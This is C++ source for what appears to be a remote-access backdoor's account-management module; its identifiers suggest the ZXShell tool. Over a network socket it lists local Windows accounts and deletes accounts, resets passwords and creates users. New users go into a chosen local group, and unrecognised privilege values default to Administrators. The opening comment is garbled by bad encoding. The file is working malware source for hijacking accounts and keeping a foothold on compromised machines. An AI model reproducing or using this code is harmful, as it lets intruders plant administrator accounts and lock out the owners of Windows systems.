//ö��ϵͳ�˺�

BOOL GetUser(SOCKET Socket)
{
    LPUSER_INFO_3 pBuf   = NULL;
    LPUSER_INFO_3 pTmpBuf;
    DWORD i;
    DWORD dwLevel        = 3;
    DWORD dwPrefMaxLen   = -1;
    DWORD dwEntriesRead  = 0;
    DWORD dwTotalEntries = 0;
    DWORD dwResumeHandle = 0;
    LPTSTR pszServerName = NULL;
    NET_API_STATUS nStatus;

    do
    {
       nStatus = ZXSAPI::NetUserEnum(NULL,dwLevel,FILTER_NORMAL_ACCOUNT,(LPBYTE*)&pBuf,
                             dwPrefMaxLen,&dwEntriesRead,&dwTotalEntries,&dwResumeHandle);
       if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))
       {
          if ((pTmpBuf = pBuf) != NULL)
          {
              for (i = 0; (i < dwEntriesRead); i++)
			  {
                if (pTmpBuf == NULL)
                {
                   SendMessage(Socket, "An Access Violation Has Occurred\r\n");
                   break;
                }
                SendMessage(Socket, "%-10S\t", pTmpBuf->usri3_name); 
		        switch(pTmpBuf->usri3_priv)
				{
			     case USER_PRIV_GUEST:
			          SendMessage(Socket, "%-7s\t\r\n","(Guest)");
			          break;
			     case USER_PRIV_USER:
			          SendMessage(Socket, "%-7s\t\r\n","(User)");
			          break;
			     case USER_PRIV_ADMIN:
			          SendMessage(Socket, "%-10s\t\r\n","(Administrator)");
			          break;
			     default:
			          SendMessage(Socket, "%-7s\t\r\n","(Unknow)");
			          break;
				}
                pTmpBuf++;
			  }
          }
          SendMessage(Socket, "\r\nList System Accounts Completed\r\n");
       }
       else
	   {
			err_display(Socket, "GetUser->NetUserEnum", 1);
	   }

       if (pBuf != NULL)
       {
          ZXSAPI::NetApiBufferFree(pBuf);
          pBuf = NULL;
       }
    }while (nStatus == ERROR_MORE_DATA);
    if (pBuf != NULL)
       ZXSAPI::NetApiBufferFree(pBuf);
    memset(Temp,0,MAX_BUFF);
    return TRUE;
}

BOOL DelUser(SOCKET Socket, char *lpUserNameA)
{
	BOOL    bResult     = TRUE;
 	WCHAR user[32*sizeof(WCHAR)];
  
	NET_API_STATUS nStatus;
	LPWSTR  lpUserNameW = user;

	memset(user, 0, sizeof(user));

	mbstowcs(user, lpUserNameA, sizeof(user)-sizeof(WCHAR));	

	if((nStatus = ZXSAPI::NetUserDel(NULL, lpUserNameW)) != NERR_Success)
	{
		SendMessage(Socket, "Fail To Delete User %s \r\n",lpUserNameA);
		bResult = FALSE;
	}
	else
	{
		SendMessage(Socket, "Delete User %s Successfully\r\n",lpUserNameA);
	}



	return bResult;
}

BOOL DelUser(MainPara *args)
{
	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();
	SOCKET Socket = args->Socket;
	if(argc < 3)
	{
		SendMessage(Socket, "Usage: user del UserName\r\n");
		return FALSE;
	}
	return DelUser(Socket, argv[2]);
}

DWORD ChangeUserPassword(char *UserName, char *Password)
{
	WCHAR user[32*sizeof(WCHAR)];
	WCHAR passwd[PWLEN+2];
	USER_INFO_1003 ui1003;
	ui1003.usri1003_password = passwd;

	DWORD dwLevel = 1003;
	NET_API_STATUS nStatus;

	memset(user, 0, sizeof(user));
	memset(passwd, 0, sizeof(passwd));

	mbstowcs(user, UserName, sizeof(user)-sizeof(WCHAR));
	mbstowcs(passwd, Password, sizeof(passwd)-sizeof(WCHAR));

	return ZXSAPI::NetUserSetInfo(NULL, user, dwLevel, (LPBYTE)&ui1003, NULL);
}

BOOL ChangeUserPassword(MainPara *args)
{

	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();
	SOCKET Socket = args->Socket;
	if(argc < 4)
	{
		SendMessage(Socket, "Usage: user psw username password\r\n");
		return FALSE;
	}
	NET_API_STATUS nStatus;

	nStatus = ChangeUserPassword(argv[2], argv[3]);

	SetLastError(nStatus);
	err_display(Socket, "Change Password", 1);

	return nStatus == 0;
}

BOOL AddUser(MainPara *args)
{
	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();
	SOCKET Socket = args->Socket;
	char *Usage = ""
"user add <priv> <username> <password>\r\n\r\n"
"priv:\r\n"
"GUEST 0\r\n"
"USER  1\r\n"
"ADMIN 2\r\n\r\n"

"example: user add 2 aaa hello\r\n"
;
	if(argc < 5)
	{
		SendMessage(Socket, Usage);
		return FALSE;
	}


	WCHAR user[32*sizeof(WCHAR)];
	WCHAR passwd[PWLEN+2];
	WCHAR *GroupName;
	USER_INFO_1 ui;
	LOCALGROUP_MEMBERS_INFO_3 lmi3;
	DWORD dwLevel = 1;
	DWORD dwError = 0;
	NET_API_STATUS nStatus;

	switch(atoi(argv[2]))
	{
		case 0:
			GroupName = L"Guests";
			break;
		case 1:
			GroupName = L"Users";
			break;
		case 2:
			GroupName = L"Administrators";
			break;
		default:
			GroupName = L"Administrators";
			break;
	}

	//
	// Set up the USER_INFO_1 structure.
	//  USER_PRIV_USER: name identifies a user, 
	//    rather than an administrator or a guest.
	//  UF_SCRIPT: required for LAN Manager 2.0 and
	//    Windows NT and later.
	//
	memset(user, 0, sizeof(user));
	memset(passwd, 0, sizeof(passwd));

	mbstowcs(user, argv[3], sizeof(user)-sizeof(WCHAR));
	mbstowcs(passwd, argv[4], sizeof(passwd)-sizeof(WCHAR));

	ui.usri1_name = user;
	ui.usri1_password = passwd;
	ui.usri1_priv = USER_PRIV_USER;
	ui.usri1_home_dir = NULL;
	ui.usri1_comment = NULL;
	ui.usri1_flags = UF_SCRIPT;
	ui.usri1_script_path = NULL;

	lmi3.lgrmi3_domainandname = user;
	//
	// Call the NetUserAdd function, specifying level 1.
	//

	nStatus = ZXSAPI::NetUserAdd(NULL,
						dwLevel,
						(LPBYTE)&ui,
						&dwError);
	
	if(nStatus == 0 || nStatus == NERR_UserExists)
	{
		ChangeUserPassword(argv[3], argv[4]);
		nStatus = ZXSAPI::NetLocalGroupAddMembers(NULL, GroupName, 3, (LPBYTE)&lmi3, 1);
	}

	SetLastError(nStatus);
	err_display(Socket, "Add User", 1);

	return nStatus == 0;

}

BOOL User(MainPara *args)
{
	SPAMFUNCTION
		
	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();
	SOCKET Socket = args->Socket;
	char *Usage = ""
"user [ list | add | del | psw ]\r\n"
"list----------lists all accounts.\r\n"
"add-----------adds a user account.\r\n"
"del-----------deletes a user account.\r\n"
"psw-----------changes password.\r\n"
;
	BOOL nRet;

	if(argc < 2)
	{
		SendMessage(Socket, Usage);
		return 0;
	}

	if(!stricmp(argv[1], "list"))
		nRet = GetUser(Socket);
	else if(!stricmp(argv[1], "add"))
		nRet = AddUser(args);
	else if(!stricmp(argv[1], "del"))
		nRet = DelUser(args);
	else if(!stricmp(argv[1], "psw"))
		nRet = ChangeUserPassword(args);
	else
		SendMessage(Socket, Usage);

	return nRet;
}